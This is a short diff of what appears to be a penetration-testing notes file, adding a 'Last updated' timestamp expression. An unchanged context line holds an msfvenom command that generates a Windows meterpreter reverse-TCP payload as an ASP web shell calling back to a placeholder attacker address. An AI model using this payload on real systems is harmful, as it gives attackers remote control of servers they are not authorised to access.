@@ -27,7 +27,4 @@ created: 2024-12-21
 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -f asp -o shell.asp
 
 
-
-
-
-
+Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
